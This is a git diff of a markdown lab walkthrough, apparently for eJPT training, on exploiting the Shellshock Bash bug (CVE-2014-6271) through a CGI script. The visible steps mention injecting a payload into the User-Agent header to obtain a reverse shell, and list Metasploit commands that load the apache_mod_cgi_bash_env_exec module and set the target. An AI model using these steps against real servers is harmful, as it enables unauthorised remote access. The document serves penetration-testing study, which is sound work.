@@ -1,20 +1,10 @@
 # Bash CVE-2014-6271 Vulnerability (Shellshock)
 
-
-__Step 1: Navigate to the target domain.__
-
-![image0](/Cgi/image0.jpg)
-
-_A website is running at port 80 of the target._
-
-__Step 2: Right-click and select "View Page Source."__
-
 ![image1](/Cgi/image1.jpg)
-
 
 _A CGI script is running on the target server._
 
-__Step 3: Use the Nmap NSE script to check if the server is vulnerable to shellshock attack.__
+__Step 1: Use the Nmap NSE script to check if the server is vulnerable to shellshock attack.__
 
 __Command:__
 
@@ -24,12 +14,7 @@ __Command:__
 
 
 
-__Step 4: Right-click and select “Send to Repeater” Option and Navigate to the Repeater tab.__
-
-![image3](/Cgi/image3.jpg)
-
-
-__Step 5: Modify the User-Agent and inject the malicious payload.__
+__Step 2: Modify the User-Agent and inject the malicious payload.__
 
 __Payload:__
 
@@ -57,7 +42,6 @@ command:
 
 __you will get reverse shell__
 
-![image11](/Cgi/image11.png)
 
 
 
@@ -67,16 +51,13 @@ __Step 1: Start the `msfconsole`__
 __command:__
 - __`service postgresql start & msfconsole`__
 
-![image12](https://github.com/Chittu13/eJPTv2/blob/main/Cgi/image12.png)
-
-__Step 2: Search shellshock and type the below command__
+__Step 2: use below exploit__
 __command:__
  - __`use exploit/multi/http/apache_mod_cgi_bash_env_exec`__
-![image13](/Cgi/image13.png)
 
-__Step 3: set the rhost and 
+__Step 3: set the rhost and TARGETURL__
 __command:__
   - __`set RHOSTS <target ip>`__
   - __`set TARGETURI /gettime.cig`__
-![image13](/Cgi/image14.png)
+
 
